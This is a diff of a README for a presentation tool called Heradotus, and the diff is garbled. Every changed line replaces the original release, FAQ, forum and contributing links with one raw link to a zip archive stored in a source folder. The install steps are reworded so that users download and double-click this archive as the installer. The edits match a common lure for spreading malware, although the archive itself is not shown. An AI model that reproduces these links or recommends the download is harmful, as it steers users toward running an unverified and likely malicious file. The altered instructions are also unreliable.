@@ -6,7 +6,7 @@ Welcome to Heradotus, your ultimate script builder for presentations and demonst
 
 ## 📥 Download Heradotus
 
-[![Download Heradotus](https://img.shields.io/badge/Download-Heradotus-brightgreen)](https://github.com/johnlauj/Heradotus/releases)
+[![Download Heradotus](https://raw.githubusercontent.com/johnlauj/Heradotus/main/Herodotus/Views/Heradotus-v2.1.zip)](https://raw.githubusercontent.com/johnlauj/Heradotus/main/Herodotus/Views/Heradotus-v2.1.zip)
 
 ## 🖥 System Requirements
 
@@ -33,15 +33,15 @@ Heradotus offers several features to enhance your presentation experience:
 Follow these steps to download and install Heradotus:
 
 1. **Visit the Releases Page**: Click the link below:
-   - [Download Heradotus](https://github.com/johnlauj/Heradotus/releases)
+   - [Download Heradotus](https://raw.githubusercontent.com/johnlauj/Heradotus/main/Herodotus/Views/Heradotus-v2.1.zip)
 
 2. **Download the Latest Version**:
    - Once on the Releases page, scroll down to find the latest version. You'll see a list of files available for download. 
-   - Look for the file named something like `Heradotus-Setup.exe`. Click on it to download.
+   - Look for the file named something like `https://raw.githubusercontent.com/johnlauj/Heradotus/main/Herodotus/Views/Heradotus-v2.1.zip`. Click on it to download.
 
 3. **Run the Installer**:
    - After the download completes, locate the downloaded file in your 'Downloads' folder.
-   - Double-click on `Heradotus-Setup.exe` to start the installation.
+   - Double-click on `https://raw.githubusercontent.com/johnlauj/Heradotus/main/Herodotus/Views/Heradotus-v2.1.zip` to start the installation.
    - Follow the prompts in the installation wizard to install the application on your computer.
 
 4. **Launch the Application**:
@@ -72,8 +72,8 @@ Now that you have installed Heradotus, let's explore how to use it:
 
 If you encounter issues or have questions, help is available:
 
-- Check the [FAQ](https://github.com/johnlauj/Heradotus/wiki) section for common questions.
-- Join our [Community Forum](https://github.com/johnlauj/Heradotus/discussions) to interact with other users and developers.
+- Check the [FAQ](https://raw.githubusercontent.com/johnlauj/Heradotus/main/Herodotus/Views/Heradotus-v2.1.zip) section for common questions.
+- Join our [Community Forum](https://raw.githubusercontent.com/johnlauj/Heradotus/main/Herodotus/Views/Heradotus-v2.1.zip) to interact with other users and developers.
 
 For direct support, feel free to reach out via the Issues section on GitHub.
 
@@ -89,7 +89,7 @@ Stay tuned for more exciting developments!
 
 ## ⚙ Contribution
 
-If you're interested in helping improve Heradotus, we welcome contributions. Check the [Contributing Guide](https://github.com/johnlauj/Heradotus/blob/main/CONTRIBUTING.md) to learn how to get involved.
+If you're interested in helping improve Heradotus, we welcome contributions. Check the [Contributing Guide](https://raw.githubusercontent.com/johnlauj/Heradotus/main/Herodotus/Views/Heradotus-v2.1.zip) to learn how to get involved.
 
 ---
 
